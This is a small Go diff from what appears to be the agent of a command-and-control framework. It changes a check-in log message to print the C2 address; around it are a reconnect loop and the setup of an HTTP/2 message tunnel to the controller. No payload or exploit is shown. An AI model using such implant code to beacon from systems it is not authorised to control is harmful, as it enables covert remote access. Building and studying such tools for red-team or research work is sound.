@@ -71,7 +71,7 @@ connect:
 		time.Sleep(5 * time.Second)
 		goto connect
 	}
-	log.Println("Checked in")
+	log.Printf("Checked in on CC: %s", agent.CCAddress)
 
 	// connect to MsgAPI, the JSON based h2 tunnel
 	msgURL := agent.CCAddress + tun.MsgAPI
